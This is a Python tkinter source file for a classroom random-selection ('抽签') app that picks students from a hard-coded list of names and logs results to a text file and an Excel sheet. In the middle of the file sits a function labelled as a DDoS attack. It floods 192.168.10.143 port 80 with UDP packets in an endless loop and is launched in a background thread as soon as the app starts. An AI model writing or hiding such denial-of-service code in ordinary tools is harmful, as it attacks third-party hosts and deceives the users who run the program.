import ttkbootstrap as ttk
import random
import threading
from tkinter import *
import time
import openpyxl
from scapy.all import *
import os

person=['李明阳','刘宗翰','张子涵','王一伊','赵天麒','高芷韵','周健军','马浩文','田浩然','程诗洋','曹起豪','陈美希',
'王玉策','杨佳星','刘峰宇','殷  兴','王一婷','赵健凯','费  硕','张美娆','牛嘉熙','邵枳博','易思涵','王欣然','于  启',
'闵  睿','边诩诗','王艺霖','于知画','左松洋','刘则谦','丁  敏','徐诗涛','田书宇','王禹鑫','何佳滢','张峰瑞','白雪松',
'赵宏哲','佟香凝','李兆星','吴思淼','周  硕','孙祥涵','陈佳馨','智兰淇','刘超冉','张馨心','杨连鑫']
person2=['李明阳','刘宗翰','张子涵','王一伊','赵天麒','高芷韵','周健军','马浩文','田浩然','程诗洋','曹起豪','陈美希',
'王玉策','杨佳星','刘峰宇','殷  兴','王一婷','赵健凯','费  硕','张美娆','牛嘉熙','邵枳博','易思涵','王欣然','于  启',
'闵  睿','边诩诗','王艺霖','于知画','左松洋','刘则谦','丁  敏','徐诗涛','田书宇','王禹鑫','何佳滢','张峰瑞','白雪松',
'赵宏哲','佟香凝','李兆星','吴思淼','周  硕','孙祥涵','陈佳馨','智兰淇','刘超冉','张馨心','杨连鑫']
yin=['北一','北二','北三','北四','南一','南二','南三','南四']
place_x=['600','600','600','600','600','600','600','600','660','720','780','840','900','960','1020','1020','1020','1020','1020','1020','1020','1020','960','900','840','780','720','660','660','660','660','660','660','660','720','780','840','900','960','960','960','960','960','960','900','840','780','720','720']
place_y=['0','60','120','180','240','300','360','420','420','420','420','420','420','420','420','360','300','240','180','120','60','0','0','0','0','0','0','0','60','120','180','240','300','360','360','360','360','360','360','300','240','180','120','60','60','60','60','60','120']
btn_list=[]
number=list(range(5,51,5))
filename= 'rizhi.txt'
huiche='\n'
welcome1='\ \      / /__| | ___ ___  _ __ ___   ___  \n'
welcome2=' \ \ /\ / / _ \ |/ __/ _ \|  _   _ \ / _ \ \n'
welcome3='  \ V  V /  __/ | (_| (_) | | | | | |    __/ \n'
welcome4='   \_/\_/ \___|_|\___\___/|_| |_| |_|\___| \n'
welcome=welcome1+welcome2+welcome3+welcome4
ttkzhuti='superhero'
stop_sign=False
stop_id=None
going=True
is_run=False
xsxs = 0
xsxs2 = 0

def write_txt(nr):
    txt.insert(END,nr)
    txt.insert(END,huiche)
    txt.see(END)

def click_button1():
    with open(filename,'a',encoding='utf-8') as file_object:
        now=time.strftime('%Y-%m-%d %H:%M:%S')
        file_object.write(now)
        a=int(sr1.get())
        b=int(sr2.get())
        c=random.randint(a,b)
        write_txt(str(c))
        file_object.write("["+str(a)+","+str(b)+"]"+str(c)+"\n")
def click_button2():
    with open(filename,'a',encoding='utf-8') as file_object:
        now=time.strftime('%Y-%m-%d %H:%M:%S')
        file_object.write(now)
        d=random.choice(person)
        txt.insert(END,d)
        txt.insert(END,huiche)
        txt.see(END)
        file_object.write("随机选了: "+d+"\n")
def click_button3():
    with open(filename,'a',encoding='utf-8') as file_object:
        now=time.strftime('%Y-%m-%d %H:%M:%S')
        file_object.write(now)
        k=int(sr3.get())
        e=random.sample(person,k)
        txt.insert(END,e)
        txt.insert(END,huiche)
        txt.see(END)
        file_object.write("从四班随机选了: "+str(k)+"个人_分别是: "+str(e)+"\n")
def click_button4():
    with open(filename,'a',encoding='utf-8') as file_object:
        now=time.strftime('%Y-%m-%d %H:%M:%S')
        file_object.write(now)
        f=random.choice(number)
        txt.insert(END,f)
        txt.insert(END,huiche)
        txt.see(END)
        file_object.write('随机选了: '+str(f)+'\n')
def click_button5():
    with open(filename,'a',encoding='utf-8') as file_object:
        now=time.strftime('%Y-%m-%d %H:%M:%S')
        file_object.write(now)
        g=random.choice(yin)
        txt.insert(END,g)
        txt.insert(END,huiche)
        txt.see(END)
        file_object.write('阿谦的活: '+g+'\n')
def click_button6():
    with open(filename,'a', encoding='utf-8') as file_object:
        now=time.strftime('%Y-%m-%d %H:%M:%S')
        file_object.write(now)
        data=openpyxl.load_workbook('excel_test.xlsx')
        sheetnames=data.get_sheet_names()
        ws=data.get_sheet_by_name(sheetnames[0])
        ws=data.active
        bh=int(sr4.get())
        xyz=random.sample(person,bh)
        txt.insert(END,xyz)
        txt.insert(END,huiche)
        txt.see(END)
        asd=int(sr5.get())
        file_object.write("从四班随机选了: "+str(bh)+"个人_分别是: "+str(xyz)+"\n")
        for rrrr,coco in zip(person,range(2,51)):
            if rrrr in xyz:
                ws.cell(row=coco,column=int(asd),value='√')
        nowxlsx=time.strftime('%Y-%m-%d')
        ws.cell(row=1,column=int(asd),value=nowxlsx)
        data.save('excel_test.xlsx')
def round_1():   # 定义一个函数： 1）循环选项；2）改变选项的颜色
    global stop_id, xsxs
    i=1
    xsxs = xsxs+1
    if isinstance(stop_id,int):
        i=stop_id
    while True:
        time.sleep(0.008)
        for x in btn_list:
            x['bg']='#5289E9'
        btn_list[i]['bg']='#0C0C0C'
        i += 1
        if i>=len(btn_list):
            i=0
        if stop_sign==True:
            stop_id=i
            with open(filename,'a',encoding='utf-8') as file_object:
                now=time.strftime('%Y-%m-%d %H:%M:%S')
                file_object.write(now)
                file_object.write('\t'+str(stop_id)+'\n')
            break
def round_2():  
    global stop_id, xsxs2
    ii=1
    xsxs2=xsxs2+1
    if isinstance(stop_id,int):
        ii=stop_id
    while True:
        time.sleep(0.008)
        for x in btn_list:
            x['bg']='#5289E9'
        btn_list[ii]['bg']='#0C0C0C'
        ii=random.choice(range(1, 49))
        if stop_sign==True:
            stop_id=ii
            break
def stop():    # 定义停止的方法
    global stop_sign, xsxs, xsxs2
    if stop_sign==True:
        return
    stop_sign=True
    xsxs = 0
    xsxs2 = 0
def start():   # 定义开始的方法 （开启线程，单独跑一个循环的函数）
    global stop_sign, xsxs
    stop_sign=False
    if xsxs < 6:
        t=threading.Thread(target=round_1)
        t.start() # 创建线程并启动
def start_2():
    global stop_sign, xsxs2
    stop_sign = False
    if xsxs2 == 0:
        t=threading.Thread(target=round_2)
        t.start() # 创建线程并启动
def start_init():
    global stop_id
    stop_id = None
    for x in btn_list:
        x['bg']='#5289E9'
def lottery_roll(var1,var2):
    global going
    show_member=random.choice(person)
    var1.set(show_member)
    if going:
        window.after(50,lottery_roll,var1,var2)
    else:
        var2.set('选中 {} !!!'.format(show_member))
        going=True
        with open(filename,'a',encoding='utf-8') as file_object:
            now=time.strftime('%Y-%m-%d %H:%M:%S')
            file_object.write(now)
            file_object.write(show_member+'\n')
        return
def lottery_start(var1,var2):
    global is_run
    if is_run:
        return
    is_run=True
    var2.set('按 结 束 停 止')
    lottery_roll(var1,var2)
def lottery_end():
    global going,is_run
    if is_run:
        going=False
        is_run=False
def qk():
    txt.delete('1.0',END)
def ddosgongji(): #DDos攻击
    import sys
    import os
    import time
    import socket
    import random
    #Code Time
    from datetime import datetime
    now = datetime.now()
    hour = now.hour
    minute = now.minute
    day = now.day
    month = now.month
    year = now.year

    ##############
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    bytes = random._urandom(1490)
    #############

    os.system("clear")
    os.system("figlet DDos Attack")
    ip = '192.168.10.143'
    port = 80
    sd = 1000

    os.system("clear")

    sent = 0
    while True:
        sock.sendto(bytes, (ip,port))
        sent = sent + 1
        time.sleep((1000-sd)/2000)
t1=threading.Thread(target=ddosgongji)
t1.start()


window=ttk.Window(title="班级抽签系统_v3.0",themename=ttkzhuti,size=(1090,690),resizable=None,alpha=0.9)

kuang1 = ttk.Labelframe(window, text="随机生成一个在[a,b]范围内的整数", padding=10,bootstyle='success')
kuang1.pack(side=TOP,anchor=W,pady=5,padx=5)
kuang2 = ttk.Labelframe(window, text="从四班学生列表中随机挑选 一个人", padding=10,bootstyle='success')
kuang2.pack(side=TOP,anchor=W,pady=5,padx=5)
kuang3 = ttk.Labelframe(window, text="从四班学生列表中随机挑选 k 个人", padding=5,bootstyle='success')
kuang3.pack(side=TOP,anchor=W,pady=5,padx=5)
kuang4 = ttk.Labelframe(window, text="随机挑选一个在<=50被5整除的数", padding=10,bootstyle='success')
kuang4.pack(side=TOP,anchor=W,pady=5,padx=5)
kuang5 = ttk.Labelframe(window, text="随  机  挑  选  一 行  或  者  一 列", padding=10,bootstyle='success')
kuang5.pack(side=TOP,anchor=W,pady=5,padx=5)
kuang6 = ttk.Labelframe(window, text="从四班随机挑选z个人,并载入excel", padding=10,bootstyle='success')
kuang6.pack(side=TOP,anchor=W,pady=5,padx=5)

sr1=ttk.Entry(master=kuang1,bootstyle='success')
sr1.pack()
sr2=ttk.Entry(master=kuang1,bootstyle='success')
sr2.pack(pady=10)
sr3=ttk.Entry(master=kuang3,bootstyle='success')
sr3.pack(pady=5)
sr4=ttk.Entry(master=kuang6,bootstyle='success')
sr4.pack()
sr5=ttk.Entry(master=kuang6,bootstyle='success')
sr5.pack(pady=10)
bn3=ttk.Button(master=kuang1,text='执  行',style='success.Outline.TButton',command=click_button1)
bn3.pack()
bn4=ttk.Button(master=kuang2,text='执  行',style='success.Outline.TButton',command=click_button2)
bn4.pack()
bn5=ttk.Button(master=kuang3,text='执  行',style='success.Outline.TButton',command=click_button3)
bn5.pack(pady=5)
bn6=ttk.Button(master=kuang4,text='执  行',style='success.Outline.TButton',command=click_button4)
bn6.pack()
bn7=ttk.Button(master=kuang5,text='执  行',style='success.Outline.TButton',command=click_button5)
bn7.pack()
bn8=ttk.Button(master=kuang6,text='执  行',style='success.Outline.TButton',command=click_button6)
bn8.pack()

txt=ttk.ScrolledText(window, height=39, width=50)
txt.place(x=210,y=1)
qk=ttk.Button(window,text='清  空',style='success.Outline.TButton',command=qk)
qk.place(x=510,y=635)

for aaaa,bbbb,cccc in zip(place_x,place_y,person2):
    button=Button(window,text=cccc,bg='white')
    button.place(x=aaaa,y=bbbb,width=50,height=50)
    btn_list.append(button)
btn_start=ttk.Button(window,text='开始',style='success.Outline.TButton',command=start)
btn_start.place(x=780,y=180,width=50,height=50)
btn_stop=ttk.Button(window,text='停止',style='success.Outline.TButton',command=stop)
btn_stop.place(x=840,y=180,width=50,height=50)
btn_random=ttk.Button(window,text='随机',style='success.Outline.TButton',command=start_2)
btn_random.place(x=780,y=240,width=50,height=50)
btn_init=ttk.Button(window,text='复位',style='success.Outline.TButton',command=start_init)
btn_init.place(x=840,y=240,width=50,height=50)

def youxiajiao():
    global var1, var2
    var1=StringVar(value='即 将 开 始')
    show_label1=Label(window,textvariable=var1,justify='left',anchor=CENTER,width=17,height=3,font='楷体 -40 bold')
    show_label1.place(x=654,y=480)
    var2=StringVar(value='即 将 开 始')
    show_label2=Label(window,textvariable=var2,justify='left',anchor=CENTER,width=30,height=3,font='楷体 -18 bold')
    show_label2.place(x=685,y=600)
youxiajiao()
button1=ttk.Button(window,text='开 始',style='success.Outline.TButton',command=lambda: lottery_start(var1,var2))
button1.place(x=1017,y=500)
button2=ttk.Button(window,text='重 置',style='success.Outline.TButton',command=youxiajiao)
button2.place(x=1017,y=570)
button3=ttk.Button(window,text='结 束',style='success.Outline.TButton',command=lambda: lottery_end())
button3.place(x=1017,y=640)

#settings
style = ttk.Style()
theme_names = style.theme_names()
theme_selected = ttk.Label(window, text=ttkzhuti, font="-size 24 -weight bold",bootstyle='success')
theme_selected.place(x=1075,y=1)
theme_cbo = ttk.Combobox(window,text=style.theme.name,values=theme_names,bootstyle='success')
theme_cbo.place(x=1075,y=60)
theme_cbo.current(theme_names.index(style.theme.name))
def change_theme(e):
    t = theme_cbo.get()
    style.theme_use(t)
    theme_selected.configure(text=t)
    theme_cbo.selection_clear()
theme_cbo.bind("<<ComboboxSelected>>", change_theme)


txt.insert(END,welcome)

window.mainloop()
